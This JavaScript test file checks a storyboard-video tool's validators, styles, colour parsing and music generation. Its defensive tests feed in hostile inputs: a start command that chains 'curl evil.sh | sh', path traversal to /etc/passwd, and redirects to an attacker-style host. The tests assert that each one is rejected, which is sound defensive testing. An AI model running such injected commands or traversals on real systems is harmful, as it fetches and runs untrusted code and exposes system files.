import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync, statSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { validate, softWarnings, assetPath } from '../render.mjs';
import { validateVisual, VISUAL_TYPES } from '../visuals.mjs';
import { resolveStyle, PRESETS, contrast } from '../style.mjs';
import { generateMusic } from '../music.mjs';
import { validateConfig } from '../capture.mjs';
import { parseColor } from '../detect-style.mjs';

const HERE = dirname(fileURLToPath(import.meta.url));
const ICONS = JSON.parse(readFileSync(join(HERE, '..', 'engine', 'icons.json'), 'utf8'));
const has = (list, re) => list.some((m) => re.test(m));
const visualOnly = (visual) => ({ title: 'T', scenes: [{ caption: 'c', visual }] });

test('storyboards made only of visuals need no nodes; map scenes still do', () => {
  assert.deepEqual(validate(visualOnly({ type: 'checklist', items: [{ label: 'Card valid', ok: true }] })), []);
  assert.ok(has(validate({ title: 'T', scenes: [{ caption: 'c' }] }), /no "visual" and there are no "nodes"/));
});

test('every visual type validates its required data and references', () => {
  assert.equal(VISUAL_TYPES.length, 9);
  const agents = { type: 'agents', agents: [{ id: 'a', name: 'A' }], tools: [{ id: 't', name: 'T' }],
    steps: [{ from: 'a', to: 'ghost', type: 'message' }, { from: 'a', to: 'a', type: 'tool' }, { from: 'x', type: 'think' }] };
  const e = validateVisual(agents, 'v', ICONS);
  assert.ok(has(e, /steps\[0\]\.to: "ghost"/));
  assert.ok(has(e, /steps\[1\]: a "tool" step needs "to" set to one of the tools/));
  assert.ok(has(e, /steps\[2\]\.from: "x" is not an agent/));
  assert.ok(has(validateVisual({ type: 'pipeline', item: { fields: [['a', '1']] }, stages: [{ label: 'S', effect: 'change', field: 'b' }] }, 'v', ICONS), /field "b" does not exist/));
  assert.ok(has(validateVisual({ type: 'decision', question: 'Q?', options: [{ label: 'only' }] }, 'v', ICONS), /at least two outcomes/));
  assert.ok(has(validateVisual({ type: 'screen', highlights: [{ x: 2, y: 0, w: 1, h: 1 }] }, 'v', ICONS), /src|fractions/));
  assert.ok(has(validateVisual({ type: 'hologram' }, 'v', ICONS), /unknown visual type/));
  assert.deepEqual(validateVisual({ type: 'chat', messages: [{ from: 'user', text: 'hi' }] }, 'v', ICONS), []);
});

test('claims inside visuals are flagged like captions', () => {
  const sb = visualOnly({ type: 'chat', messages: [{ from: 'assistant', text: 'Your refund arrives instantly.' }] });
  validate(sb);
  assert.ok(has(softWarnings(sb), /"instantly"/));
});

test('styles resolve presets, overrides and keep brand colours readable', () => {
  assert.ok(Object.keys(PRESETS).length >= 10);
  const r = resolveStyle({ style: { preset: 'neural', accent: '#101010', font: { family: 'Inter' } } }, HERE);
  assert.deepEqual(r.errors, []);
  assert.ok(contrast(r.style.accent, r.style.colors.bg) >= 3, 'dark accent nudged on dark background');
  assert.ok(has(r.warnings, /low contrast/));
  assert.match(r.style.font.family, /^Inter, /);
  assert.ok(has(resolveStyle({ style: { preset: 'nope' } }, HERE).errors, /unknown/));
  assert.equal(resolveStyle({ theme: 'light' }, HERE).style.preset, 'daylight');
  for (const [name, p] of Object.entries(PRESETS)) assert.ok(contrast(p.colors.text, p.colors.bg) >= 7, `${name} text contrast`);
});

test('brand colours parse from every common notation', () => {
  assert.equal(parseColor('#0ea5e9'), '#0EA5E9');
  assert.equal(parseColor('#FF0EA5E9'), '#0EA5E9');
  assert.equal(parseColor('0xFF0EA5E9'), '#0EA5E9');
  assert.equal(parseColor('rgb(14, 165, 233)'), '#0EA5E9');
  assert.equal(parseColor('199 89% 48%'), parseColor('hsl(199, 89%, 48%)'));
  assert.match(parseColor('oklch(0.685 0.169 237.3)'), /^#[0-9A-F]{6}$/);
  assert.equal(parseColor('var(--x)'), null);
});

test('generated music is a valid stereo WAV of the requested length', () => {
  const f = join(mkdtempSync(join(tmpdir(), 'cfv-')), 'm.wav');
  generateMusic(f, { duration: 6, boundaries: [2, 4], style: { preset: 'storefront', motion: 'snappy' } });
  const b = readFileSync(f);
  assert.equal(b.toString('ascii', 0, 4), 'RIFF');
  assert.equal(b.readUInt16LE(22), 2);
  const seconds = (statSync(f).size - 44) / (44100 * 4);
  assert.ok(seconds >= 6 && seconds < 7.5, `length ${seconds}`);
});

test('capture refuses shell commands, other sites and folders outside the repo', () => {
  const e = validateConfig({ url: 'http://localhost:3000', start: 'npm run dev; curl evil.sh | sh', cwd: '../..',
    pages: [{ id: 'a', path: '//evil.example/x', actions: [{ goto: 'https://evil.example' }] }] });
  assert.ok(has(e, /"start" must be one plain command/));
  assert.ok(has(e, /"cwd" must be a folder inside the repo/));
  assert.ok(has(e, /path must start with a single \//));
  assert.ok(has(e, /goto must start with a single \//));
  assert.deepEqual(validateConfig({ url: 'http://localhost:4173', start: 'python3 -m http.server 4173 --directory site', pages: [{ id: 'a', path: '/' }] }), []);
});

test('storyboard assets must be images or fonts inside the project', () => {
  const sbDir = join(HERE, 'fixtures', 'polyglot', 'flow-video');
  assert.ok(assetPath(sbDir, '../../../../../../etc/hosts.png', /\.png$/).error);
  assert.ok(assetPath(sbDir, '/etc/passwd', /\.png$/).error);
  assert.ok(assetPath(sbDir, 'screens/a.txt', /\.png$/).error);
  assert.ok(assetPath(sbDir, '../web/logo.png', /\.png$/).file);
});

test('capture config refuses secrets and bad pages', () => {
  assert.deepEqual(validateConfig({ url: 'http://localhost:3000', pages: [{ id: 'home', path: '/' }], env: { STRIPE_SECRET_KEY: 'sk_test_demo' } }), []);
  const e = validateConfig({ url: 'localhost', pages: [{ id: 'a b', path: 'x', actions: [{ dance: 1 }] }], env: { API_KEY: 'live-123' } });
  assert.ok(has(e, /"url" must be/));
  assert.ok(has(e, /id must be/));
  assert.ok(has(e, /path must start/));
  assert.ok(has(e, /actions\[0\]/));
  assert.ok(has(e, /env\.API_KEY looks like a real secret/));
});
